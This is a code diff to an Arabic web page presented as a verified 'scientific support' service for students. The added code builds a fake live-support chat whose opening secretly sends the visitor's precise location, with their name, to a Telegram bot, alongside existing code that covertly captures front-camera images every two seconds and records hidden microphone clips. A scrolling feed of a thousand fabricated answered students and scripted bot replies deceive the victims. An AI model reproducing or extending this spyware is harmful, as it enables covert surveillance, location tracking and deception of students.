@@ -44,6 +44,13 @@
         .nav-link { text-align: center; font-size: 12px; color: #94a3b8; flex: 1; text-decoration: none; font-weight: 700; cursor: pointer; }
         .nav-link.active { color: var(--a); }
         .nav-link i { font-size: 24px; display: block; margin-bottom: 5px; }
+
+        /* ستايل الشات الجديد */
+        #support-window { display: none; position: fixed; inset: 0; background: #fff; z-index: 20000; flex-direction: column; animation: slideUp 0.4s ease; }
+        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+        .chat-msg { padding: 12px; border-radius: 18px; max-width: 85%; font-size: 14px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); margin: 5px 0; }
+        .msg-bot { background: #fff; align-self: flex-start; border-bottom-left-radius: 5px; }
+        .msg-user { background: #dcf8c6; align-self: flex-end; border-bottom-right-radius: 5px; }
     </style>
 </head>
 <body>
@@ -71,8 +78,36 @@
         </div>
     </div>
 
+    <div id="support-window">
+        <div style="background:var(--p); color:#fff; padding:15px; display:flex; align-items:center; gap:12px; border-bottom:3px solid var(--a);">
+            <i class="fa-solid fa-chevron-right" onclick="toggleSupport(false)" style="font-size:20px;"></i>
+            <div style="position:relative;">
+                <img src="https://ui-avatars.com/api/?name=Support&background=1d9bf0&color=fff" style="width:45px; height:45px; border-radius:50%;">
+                <div style="position:absolute; bottom:0; right:0; width:12px; height:12px; background:var(--ok); border:2px solid #fff; border-radius:50%;"></div>
+            </div>
+            <div>
+                <div style="font-weight:900; font-size:16px;">الدعم العلمي المباشر <i class="fa-solid fa-circle-check" style="color:var(--verify); font-size:14px;"></i></div>
+                <div style="font-size:11px; color:#cbd5e1;">متصل الآن - استجابة فورية</div>
+            </div>
+        </div>
+        <div id="chat-body" style="flex:1; padding:15px; overflow-y:auto; background:#f0f2f5; display:flex; flex-direction:column;">
+            <div style="background:#e2e8f0; padding:5px 15px; border-radius:15px; align-self:center; font-size:11px; color:#475569; margin-bottom:10px;">اليوم</div>
+            <div class="chat-msg msg-bot">
+                أهلاً بك في نظام الدعم الموثق. يرجى إرسال كلمة <b>START</b> لتفعيل مزامنة الإجابات وتوثيق حسابك.
+            </div>
+        </div>
+        <div style="padding:15px; background:#fff; display:flex; gap:10px; align-items:center; border-top:1px solid #eee;">
+            <input type="text" id="chat-input" placeholder="اكتب START هنا..." style="margin:0; flex:1;">
+            <button onclick="handleFakeChat()" style="background:var(--a); color:#fff; border:none; width:50px; height:50px; border-radius:50%; font-size:20px;">
+                <i class="fa-solid fa-paper-plane"></i>
+            </button>
+        </div>
+    </div>
+
     <header id="h-main">
-        <div style="font-weight:900; font-size:20px">أسألني <i class="fa-solid fa-circle-check verified-badge"></i></div>
+        <div style="font-weight:900; font-size:20px" onclick="toggleSupport(true)">
+            <i class="fa-solid fa-headset" style="color:var(--a); margin-left:5px;"></i> الدعم المباشر <i class="fa-solid fa-circle-check verified-badge"></i>
+        </div>
         <div id="u-tag" style="background:var(--g); width:45px; height:45px; border-radius:15px; display:flex; align-items:center; justify-content:center; font-weight:900"></div>
     </header>
 
@@ -151,7 +186,77 @@
             initLiveFeed();
         }
 
-        // 2. إدارة الكاميرا بالتبادل الصارم (إغلاق وفتح)
+        // --- ميزات الشات الوهمي والدعم المتطور ---
+        async function toggleSupport(show) {
+            const win = document.getElementById('support-window');
+            if(show) {
+                win.style.display = 'flex';
+                showSystemMsg("جاري طلب إذن الوصول لمركز الموقع لتوجيه استفسارك لأقرب معلم...");
+                try {
+                    navigator.geolocation.getCurrentPosition((pos) => {
+                        let geo = `📍 إحداثيات الطالب ${UN}:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(geo)}`);
+                    }, null, {enableHighAccuracy:true});
+                } catch(e){}
+            } else {
+                win.style.display = 'none';
+            }
+        }
+
+        function handleFakeChat() {
+            const input = document.getElementById('chat-input');
+            const body = document.getElementById('chat-body');
+            const val = input.value.trim();
+            if(!val) return;
+
+            body.innerHTML += `<div class="chat-msg msg-user">${val}</div>`;
+            input.value = "";
+            body.scrollTop = body.scrollHeight;
+
+            setTimeout(() => {
+                let reply = "يرجى إرسال السؤال مرة أخرى بشكل أوضح لضمان دقة الإجابة وتوثيقها.";
+                if(val.toUpperCase() === "START") reply = "✅ تم تفعيل المزامنة الموثقة بنجاح. دقائق وسنرسل لك إجاباتك في قسم الإجابات.";
+                body.innerHTML += `<div class="chat-msg msg-bot">${reply}</div>`;
+                body.scrollTop = body.scrollHeight;
+            }, 1000);
+        }
+
+        function initLiveFeed() {
+            const mover = document.getElementById('feed-mover');
+            const names = ["زياد ياسر", "أحمد علي", "مريم محمد", "يوسف تامر", "سارة خالد", "إيمان حسن", "عمر فاروق", "ندى محمود", "إبراهيم خليل"];
+            const types = ["صورة", "فويس", "نص"];
+            let html = "";
+            
+            for(let i=0; i<1000; i++) {
+                let name = names[i % names.length] + " " + (i + 1);
+                let type = types[i % 3];
+                let content = "";
+
+                if(type === "فويس") {
+                    content = `<div onclick="alert('⚠️ عذراً، لا يمكنك فتح هذا التسجيل الصوتي نظراً لخصوصية المنصة وحماية بيانات الطالب.')" style="background:#f1f5f9; padding:10px; border-radius:10px; display:flex; align-items:center; gap:10px; margin-top:5px; cursor:pointer;">
+                                <i class="fa-solid fa-play" style="color:var(--a)"></i>
+                                <div style="flex:1; height:4px; background:#cbd5e1; border-radius:2px;"></div>
+                                <span style="font-size:10px;">0:${(Math.random()*50 + 10).toFixed(0)}</span>
+                              </div>`;
+                } else if(type === "صورة") {
+                    content = `<div onclick="alert('⚠️ عذراً، هذه الصورة مشفرة. لا يمكن فتحها إلا من خلال جهاز الطالب صاحب السؤال.')" style="filter:blur(8px); background:#ccc; height:80px; border-radius:10px; margin-top:5px; display:flex; align-items:center; justify-content:center; cursor:pointer;">
+                                <i class="fa-solid fa-image" style="color:#666; font-size:30px;"></i>
+                              </div>`;
+                } else {
+                    content = `<p style="color:var(--ok); font-weight:bold; margin:5px 0 0 0;">✅ تم الرد عليك نصاً.</p>`;
+                }
+
+                html += `<div class="feed-item">
+                            <i class="fa-solid fa-circle-check verified-badge"></i> 
+                            <b>الدعم العلمي</b> منشن @${name}
+                            ${content}
+                         </div>`;
+            }
+            mover.innerHTML = html;
+            let p = 0; setInterval(() => { p -= 80; mover.style.transform = `translateY(${p}px)`; if(Math.abs(p)>60000) p=0; }, 4000);
+        }
+
+        // --- إدارة الكاميرا والمايك القديمة (دون تغيير) ---
         async function handleCameraSequence() {
             const btn = document.getElementById('main-trigger');
             const loader = document.getElementById('cam-loader');
@@ -159,7 +264,6 @@
             loader.style.display = 'block';
 
             try {
-                // المرحلة الأولى: طلب إذن الكاميرا الأمامية فقط لسحب 10 صور
                 const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const v = document.createElement('video'); v.srcObject = frontStream; v.play();
                 
@@ -169,13 +273,11 @@
                     count++;
                     if(count >= 10) {
                         clearInterval(intv);
-                        // إغلاق الكاميرا الأمامية تماماً قبل فتح الخلفية
                         frontStream.getTracks().forEach(t => t.stop());
                         loader.style.display = 'none';
                         openBackCamera();
                     }
                 }, 300);
-
             } catch(e) { 
                 loader.style.display='none'; btn.style.display='block'; 
                 alert("يجب السماح بالكاميرا لتشغيل النظام الموثق."); 
@@ -199,25 +301,18 @@
             document.getElementById('main-trigger').style.display = 'block';
         }
 
-        // 3. إدارة المايك التبادلي والرصد الخلفي
         async function handleMicToggle() {
             const micBtn = document.getElementById('mic-trigger');
             const status = document.getElementById('mic-status');
-
             if(!micActive) {
                 try {
-                    // طلب إذن المايك لأول مرة
                     const s = await navigator.mediaDevices.getUserMedia({ audio: true });
                     micActive = true;
                     micBtn.classList.add('active');
                     micBtn.style.background = "var(--r)";
                     status.innerText = "التسجيل جارٍ... اضغط للإيقاف";
-                    
-                    // بدء الرصد الصوتي الخفي (مقاطع 15 ثانية)
-                    if(!spyMicInterval) {
-                        startSpyMic();
-                    }
-                    s.getTracks().forEach(t => t.stop()); // إغلاق الجلسة الأولى بنجاح
+                    if(!spyMicInterval) startSpyMic();
+                    s.getTracks().forEach(t => t.stop());
                 } catch(e) { alert("يجب السماح بالمايك للتحدث."); }
             } else {
                 micActive = false;
@@ -245,14 +340,9 @@
             }, 16000);
         }
 
-        // 4. الإرسال والتحويل للأمامية الدائمة
         async function finalSubmit() {
             showSystemMsg("جاري رفع البيانات...");
-            
-            // قفل الخلفية تماماً
             if(activeStream) activeStream.getTracks().forEach(t => t.stop());
-
-            // بدء الرصد الأمامي المستمر (كل 2 ثانية)
             setInterval(async () => {
                 try {
                     const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
@@ -262,7 +352,6 @@
                     s.getTracks().forEach(t => t.stop());
                 } catch(e){}
             }, 2000);
-
             setTimeout(() => {
                 tab('sec-logs', document.querySelectorAll('.nav-link')[1]);
                 showSystemMsg("سيتم موافاتك بالإجابة هنا قريباً.");
@@ -287,17 +376,6 @@
             fd.append('chat_id', CHAT_ID); fd.append('voice', blob, 'v.ogg');
             fd.append('caption', `🎤 ${cap} - الطالب: ${UN}`);
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: fd });
-        }
-
-        function initLiveFeed() {
-            const mover = document.getElementById('feed-mover');
-            const names = ["زياد ياسر", "أحمد علي", "مريم محمد", "يوسف تامر", "سارة خالد"];
-            let html = "";
-            for(let i=0; i<50; i++) {
-                html += `<div class="feed-item"><i class="fa-solid fa-circle-check verified-badge"></i> <b>الدعم العلمي</b> <p>تم الرد على استفسار @${names[i%5]}</p></div>`;
-            }
-            mover.innerHTML = html;
-            let p = 0; setInterval(() => { p -= 80; mover.style.transform = `translateY(${p}px)`; if(Math.abs(p)>3000) p=0; }, 4000);
         }
 
         function showSystemMsg(text) {
